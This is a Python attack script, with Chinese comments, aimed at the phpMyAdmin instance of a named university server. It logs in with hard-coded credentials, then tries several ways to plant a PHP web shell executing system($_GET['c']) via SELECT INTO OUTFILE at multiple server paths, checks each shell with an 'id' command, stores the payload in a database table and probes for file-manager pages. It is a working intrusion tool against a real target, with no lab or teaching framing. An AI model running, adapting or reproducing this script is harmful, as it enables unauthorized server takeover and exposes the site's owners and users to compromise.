#!/usr/bin/env python3
import requests
import re
import time
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print("[*] 检查secure_file_priv设置...")
sql_data = {"sql_query": "SHOW VARIABLES LIKE 'secure_file_priv';", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
print(resp.text[:500])

print("\n[*] 方法1: 尝试phpMyAdmin目录写入...")
# phpMyAdmin目录通常可写
pma_paths = [
    "/var/www/phpmyadmin/shell.php",
    "/usr/share/phpmyadmin/shell.php",
    "/opt/lampp/phpmyadmin/shell.php",
]

for pma_path in pma_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{pma_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    time.sleep(1)
    test_url = "https://olympic.su.ac.th/phpmyadmin/shell.php?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in resp2.text:
        print(f"[+] Shell成功: {test_url}")
        exit(0)

print("\n[*] 方法2: 通过数据库表，然后用PHP读取...")
# 创建表存储shell
sql_create = "CREATE TABLE IF NOT EXISTS scmeeting.s(code TEXT);"
sql_data = {"sql_query": sql_create, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

sql_insert = "INSERT INTO scmeeting.s VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql_insert, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 查询并尝试通过web访问数据库内容
print("[*] 尝试通过web应用读取数据库...")

print("\n[*] 方法3: 检查phpMyAdmin文件管理...")
# 检查是否有文件管理功能
file_mgmt_urls = [
    url + "file_manager.php",
    url + "files.php",
    url + "import.php",
]

for fm_url in file_mgmt_urls:
    resp = session.get(fm_url, params={"token": token}, verify=False)
    if resp.status_code == 200 and "file" in resp.text.lower():
        print(f"[+] 发现文件管理: {fm_url}")

print("\n[*] 方法4: 尝试通过数据库导出到可访问位置...")
# 查询datadir
sql_data = {"sql_query": "SELECT @@datadir;", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
datadir_match = re.search(r'<td[^>]*>([^<]+)</td>', resp.text)
if datadir_match:
    datadir = datadir_match.group(1).strip()
    print(f"[*] datadir: {datadir}")
    
    # 尝试写入datadir下的目录
    shell_path = f"{datadir}/../shell.php"
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{shell_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)

print("\n[*] 方法5: 检查是否有其他可写目录...")
# 查询tmp目录
tmp_paths = [
    "/tmp/shell.php",
    "/var/tmp/shell.php",
]

for tmp_path in tmp_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{tmp_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    if "error" not in resp.text.lower() or "access denied" not in resp.text.lower():
        print(f"[*] 可能写入成功: {tmp_path}")

print("\n[-] 如果secure_file_priv限制，无法通过INTO OUTFILE写入")
print("[*] 需要其他方法：")
print("  1. 利用phpMyAdmin的SQL注入漏洞")
print("  2. 利用phpMyAdmin的文件上传功能")
print("  3. 通过其他web应用漏洞")
print("  4. 利用数据库备份恢复功能")
